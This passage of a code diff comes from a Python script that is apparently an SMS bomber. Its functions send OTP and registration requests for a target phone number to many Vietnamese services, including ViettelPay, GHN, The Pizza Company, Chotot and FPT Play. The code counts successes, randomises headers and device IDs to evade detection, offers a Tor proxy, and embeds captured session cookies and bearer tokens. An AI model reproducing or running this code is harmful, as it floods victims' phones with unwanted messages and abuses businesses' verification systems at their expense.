-        "type-os": "android",
-        "app-version": "5.1.4",
-        "os-version": "10",
-        "imei": "VTP_" + generate_random_string(32),
-        "x-request-id": "20230803164512",  # Replace with the current date and time in the format "YmdHis"
-        "content-type": "application/json; charset=UTF-8",
-        "user-agent": "okhttp/4.2.2"
-    }
-
-    data = {
-        "type": "msisdn",
-        "username": phone
-    }
-
-    response = requests.post("https://api8.viettelpay.vn/customer/v1/validate/account", json=data, headers=headers, timeout=30, verify=False)
-    get_data = response.json()
-
-    if get_data["status"]["code"] == "CS9901":
-        data = {
-            "hash": "",
-            "identityType": "msisdn",
-            "identityValue": phone,
-            "imei": "VTP_" + generate_random_string(32),
-            "notifyToken": "",
-            "otp": "android",
-            "pin": "VTP_" + generate_random_string(32),
-            "transactionId": "",
-            "type": "REGISTER",
-            "typeOs": "android",
-            "verifyMethod": "sms"
-        }
-        response = requests.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=data, headers=headers, timeout=30, verify=False)
-        get_data = response.json()
-    else:
-        data = {
-            "imei": "VTP_" + generate_random_string(32),
-            "loginType": "BASIC",
-            "msisdn": phone,
-            "otp": "",
-            "pin": "VTP_" + generate_random_string(32),
-            "requestId": "",
-            "typeOs": "android",
-            "userType": "msisdn",
-            "username": phone
-        }
-        response = requests.post("https://api8.viettelpay.vn/auth/v1/authn/login", json=data, headers=headers, timeout=30, verify=False)
-        get_data = response.json()
-
-    if "Cần xác thực bổ sung OTP" in get_data["status"]["message"] or "Vui lòng nhập mã OTP được gửi về SĐT " + phone + " để xác minh chính chủ" in get_data["status"]["message"]:
-        thanhcong+=1
-    else:
-        thatbai+=1
-def sms29(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        'authority': 'online-gateway.ghn.vn',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'access-control-request-headers': 'content-type',
-        'access-control-request-method': 'POST',
-        'origin': 'https://sso.ghn.vn',
-        'referer': 'https://sso.ghn.vn/',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    }
-
-    response = requests.options('https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone', headers=headers)
-
-
-    headers = {
-        'authority': 'online-gateway.ghn.vn',
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/json',
-        'dnt': '1',
-        'origin': 'https://sso.ghn.vn',
-        'referer': 'https://sso.ghn.vn/',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    }
-
-    json_data = {
-        'phone': phone,
-        'type': 'register',
-    }
-
-    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=30, verify=False)
-    if 'true' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-
-def sms30(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        '_gcl_au': '1.1.612062991.1693832247',
-        '_ga': 'GA1.2.2100968570.1693832247',
-        '_gid': 'GA1.2.823438155.1693832247',
-        '_tt_enable_cookie': '1',
-        '_ttp': '8QojcD2E-4ZWQyk38eZM5QTGEw2',
-        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus',
-        '.Nop.Customer': 'ba54ce0a-13e1-453c-8363-88bf017b8dcf',
-        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
-    }
-
-    headers = {
-        'authority': 'thepizzacompany.vn',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': '_gcl_au=1.1.612062991.1693832247; _ga=GA1.2.2100968570.1693832247; _gid=GA1.2.823438155.1693832247; _tt_enable_cookie=1; _ttp=8QojcD2E-4ZWQyk38eZM5QTGEw2; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus; .Nop.Customer=ba54ce0a-13e1-453c-8363-88bf017b8dcf; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
-        'dnt': '1',
-        'origin': 'https://thepizzacompany.vn',
-        'referer': 'https://thepizzacompany.vn/Otp',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'phone': phone,
-        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg',
-    }
-
-    response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data, timeout=30, verify=False)
-    if 'true' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-def sms31(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        '_gcl_au': '1.1.621175732.1703862038',
-        '_ga': 'GA1.1.1365287929.1703862041',
-        '_tt_enable_cookie': '1',
-        '_ttp': 'ND5eC2lhZd7Sracvqbh-Nlb6Ioa',
-        '_fbp': 'fb.1.1703862042460.762032013',
-        'ubo_trade': '%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D',
-        'ubo_token': 'Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
-        '_ga_KCGG79N4SY': 'GS1.1.1703862040.1.1.1703862075.0.0.0',
-        '_ga_3PKTQRQF3P': 'GS1.1.1703862040.1.1.1703862078.22.0.0',
-    }
-
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
-        'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
-        'Cache-Control': 'no-cache',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json; charset=UTF-8',
-        # 'Cookie': '_gcl_au=1.1.621175732.1703862038; _ga=GA1.1.1365287929.1703862041; _tt_enable_cookie=1; _ttp=ND5eC2lhZd7Sracvqbh-Nlb6Ioa; _fbp=fb.1.1703862042460.762032013; ubo_trade=%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ; _ga_KCGG79N4SY=GS1.1.1703862040.1.1.1703862075.0.0.0; _ga_3PKTQRQF3P=GS1.1.1703862040.1.1.1703862078.22.0.0',
-        'DNT': '1',
-        'Origin': 'https://ubofood.com',
-        'Referer': 'https://ubofood.com/register',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    json_data = {
-        'phone_number': phone,
-        'trade_code': '101019000',
-        'captcha': '03AFcWeA57DLZ2vpQbBNFdhiRbVl9Tl7LLgZNidOGidwem9Qe35fs7vriYjyeNbAHMucJqqubWkbk3utAUXx4-qrLh-ua7cURkFSvCbwjHP-5c8JzP8X8SYo9pTUGqpvBzMhidETa3Z8VDrHiiIfqmsYmEDqxnboFGMQx5CB44u8UxKmqg2egTmd2FGbYheVmTEPUUMZhP84u8T0N_R8_ybq2_2KhyvBETIX2iZni8vRSjl0osIeZ3GAqrq9goXdsml2AEi5s9HfHvktW00l5xvaNvt4FT-AHcqML0jvq-y95-J7sPzjjZRHpKD1q0Mw9NvGR_iFe6DkKpuuM83OjgWVRW2JxCRDE2FKZQ3p7Z0qIV4NqaxlJdTl6lE0RRqXnUAZiEkN0Rm4sSPhD4JkUYJPkAbDMp9FcVb_23bMBDkFtw7jmVaD6FxLFMC99Yl6xR6AUMp3ECYVHeuGV6zchUydZp3aTQAYgIFAipAUGym3eIRuaeq0TfxIzcRNMAtgkYMrwyVFrT46aMYDhQqScFUQvTRve0tpBcmgIwjyb9893ThF54reVSqAHyYoAHPcEUnXJqxvl3onmNehC_qzdNCN6jX9IKKDsvZA',
-    }
-
-    response = requests.post('https://ubofood.com/auth/register', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
-    if 'true' in response.text:
-        thanhcong+=1
-    else:
-        thatbai+=1
-def sms32(phone):
-    headers = {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'DNT': '1',
-        'Origin': 'https://www.tiencash.com',
-        'Referer': 'https://www.tiencash.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-        'deviceInfo': '{"operationSys":"","channel":null,"isMobile":"0","navigatorInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","screenHeight":768,"screenWidth":1366}',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'token': 'null',
-    }
-
-    data = {
-        'phone': phone,
-        'sign': '67d44dda-b29f-48a4-9830-67121bc618f8',
-    }
-
-    response = requests.post('https://api.tiencash.com/v1/verify/sms/send', headers=headers, data=data, timeout=30, verify=False)
-
-def sms33(phone):
-    global thanhcong
-    cookies = {
-        '_cfuvid': '_0Whbo9vhBgRfrX3KU.0_Em.3JNUy5p8NFpTsv0g07g-1703862344968-0-604800000',
-        '_gcl_au': '1.1.1302306825.1703862353',
-        'ctfp': 'af0b5e10-f911-435d-8219-ea319f569cad',
-        'showInsertAdOnboarding': 'true',
-        'cf_clearance': '7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357',
-        '_gid': 'GA1.2.754189873.1703862358',
-        '_gat_UA-54934741-3': '1',
-        '_fbp': 'fb.1.1703862360800.11155083',
-        '_ga': 'GA1.2.1777081749.1703862358',
-        'FCNEC': '%5B%5B%22AKsRol_ciqRB1xZluibXdogEf1wY5NcwxTUVCV7gL3lzzI9H-0Rhja7YDAYJfKgXp5X4qNLUwb8vJPDpeF2wEuL1JCy-m60XTJVGptiz0SrQcoDCG_l_tX-ybKmaGLZZI1WzHQMUGlCS6wErdDh02FYLFpvBJjSKQg%3D%3D%22%5D%5D',
-        '_ga_XQVN5K27XX': 'GS1.1.1703862358.1.1.1703862387.31.0.0',
-    }
-
-    headers = {
-        'authority': 'id.chotot.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'baggage': 'sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=3bb6c23624f34a47bb017aa52ab0241a,sentry-sample_rate=0.1',
-        # 'cookie': '_cfuvid=_0Whbo9vhBgRfrX3KU.0_Em.3JNUy5p8NFpTsv0g07g-1703862344968-0-604800000; _gcl_au=1.1.1302306825.1703862353; ctfp=af0b5e10-f911-435d-8219-ea319f569cad; showInsertAdOnboarding=true; cf_clearance=7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357; _gid=GA1.2.754189873.1703862358; _gat_UA-54934741-3=1; _fbp=fb.1.1703862360800.11155083; _ga=GA1.2.1777081749.1703862358; FCNEC=%5B%5B%22AKsRol_ciqRB1xZluibXdogEf1wY5NcwxTUVCV7gL3lzzI9H-0Rhja7YDAYJfKgXp5X4qNLUwb8vJPDpeF2wEuL1JCy-m60XTJVGptiz0SrQcoDCG_l_tX-ybKmaGLZZI1WzHQMUGlCS6wErdDh02FYLFpvBJjSKQg%3D%3D%22%5D%5D; _ga_XQVN5K27XX=GS1.1.1703862358.1.1.1703862387.31.0.0',
-        'dnt': '1',
-        'referer': 'https://id.chotot.com/register',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'sentry-trace': '3bb6c23624f34a47bb017aa52ab0241a-83bbc78ff51d14b7-0',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-nextjs-data': '1',
-    }
-
-    params = {
-        'phone': phone,
-    }
-
-    response = requests.get(
-        'https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json',
+        response = requests.post(
+        'https://meta.vn/app_scripts/pages/AccountReact.aspx',
         params=params,
         cookies=cookies,
         headers=headers,
+        json=json_data,
     )
-    thanhcong+=1
-def sms34(phone):
-    global thanhcong
-    headers = {
-        'Host': 'api.cashbar.tech',
-        # 'content-length': '40',
-        'accept': 'application/json, text/plain, */*',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://h5.cashbar.tech',
-        'x-requested-with': 'mark.via.gp',
-        'sec-fetch-site': 'same-site',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-dest': 'empty',
-        'referer': 'https://h5.cashbar.tech/',
-        # 'accept-encoding': 'gzip, deflate',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-    }
-    data = {
-        'phone': phone,
-        'type': '2',
-        'ctype': '1',
-        'chntoken': '',
-    }
-
-    response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data, timeout=30, verify=False)
-    thanhcong +=1
-
-def sms35(phone):
-    def random_hex(n=16):
-        return ''.join(random.choices('0123456789ABCDEF', k=n))
-    
-    def random_user_agent():
-        agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.98 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
-            'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36'
-        ]
-        return random.choice(agents)
-    
-    def random_sec_ch_ua():
-        brands = ['Google Chrome', 'Chromium', 'Microsoft Edge', 'Not;A Brand']
-        return ', '.join([f'"{b}";v="{random.randint(90, 114)}"' for b in brands])
-    
-    def random_platform():
-        platforms = ['Windows', 'Macintosh', 'Android', 'Linux']
-        return f'"{random.choice(platforms)}"'
-    
-    def generate_dynamic_headers():
-        return {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-            'content-type': 'application/json; charset=UTF-8',
-            'dnt': '1',
-            'origin': 'https://fptplay.vn',
-            'priority': 'u=1, i',
-            'referer': 'https://fptplay.vn/',
-            'sec-ch-ua': random_sec_ch_ua(),
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': random_platform(),
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': random_user_agent(),
-            'x-did': random_hex(16),
-        }
-    
-    def random_cookies():
-        return {'session': ''.join(random.choices(string.ascii_letters + string.digits, k=24))}
-    
-    def random_query_params():
-        st = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-        e = str(random.randint(1000000000, 9999999999))
-        device = "Microsoft Edge(version%3A127.0.0.0)"
-        return {'st': st, 'e': e, 'device': device}
-
-    headers = generate_dynamic_headers()
-    params = random_query_params()
-    cookies = random_cookies()
-
-    json_data = {
-        'phone': phone,
-        'country_code': 'VN',
-        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
-    }
-
+        hoanthanh("META", phone)
+    except:
+        error("META", phone)
+def blu(phone):
     try:
-        response = requests.post(
-            'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp',
-            headers=headers,
-            params=params,
-            cookies=cookies,
-            json=json_data,
-            proxies=tor_mgr.get_proxy()[0],  # nếu có Tor thì mở ra
-            timeout=30,
-            verify=False
-        )
-    except Exception as e:
-        pass
-
-def sms36(phone):
-    
-    def fptmatkhau_random_hex(n=16):
-        return ''.join(random.choices('0123456789ABCDEF', k=n))
-    
-    def fptmatkhau_random_user_agent():
-        agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.98 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
-            'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36'
-        ]
-        return random.choice(agents)
-    
-    def fptmatkhau_random_sec_ch_ua():
-        brands = ['Google Chrome', 'Chromium', 'Microsoft Edge', 'Not;A Brand']
-        return ', '.join([f'"{b}";v="{random.randint(90, 114)}"' for b in brands])
-    
-    def fptmatkhau_random_platform():
-        platforms = ['Windows', 'Macintosh', 'Android', 'Linux']
-        return f'"{random.choice(platforms)}"'
-    
-    def fptmatkhau_random_cookie_value(length=24):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-    
-    def fptmatkhau_generate_dynamic_headers():
-        return {
-            'accept': '*/*',
-            'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-            'dnt': '1',
-            'referer': 'https://fptplay.vn/',
-            'sec-ch-ua': fptmatkhau_random_sec_ch_ua(),
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': fptmatkhau_random_platform(),
-            'sec-fetch-dest': 'script',
-            'sec-fetch-mode': 'no-cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': fptmatkhau_random_user_agent(),
-        }
-    
-    def fptmatkhau_generate_dynamic_cookies():
-        return {
-            'auth.strategy': '',
-            'expire_welcome': str(random.randint(1000, 20000)),
-            'fpt_uuid': f'"{fptmatkhau_random_cookie_value(36)}"',
-            'ajs_group_id': 'null',
-            'G_ENABLED_IDPS': 'google',
-            'CDP_ANONYMOUS_ID': str(random.randint(1000000000000, 9999999999999)),
-            'CDP_USER_ID': str(random.randint(1000000000000, 9999999999999)),
-        }
-
-    cookies = fptmatkhau_generate_dynamic_cookies()
-    headers = fptmatkhau_generate_dynamic_headers()
-
-    try:
-        requests.get(
-            'https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js',
-            cookies=cookies,
-            headers=headers,
-            timeout=15,
-        )
-    except Exception as e:
-        pass
-
-    headers_post = headers.copy()
-    headers_post.update({
-        'accept': 'application/json, text/plain, */*',
-        'content-type': 'application/json; charset=UTF-8',
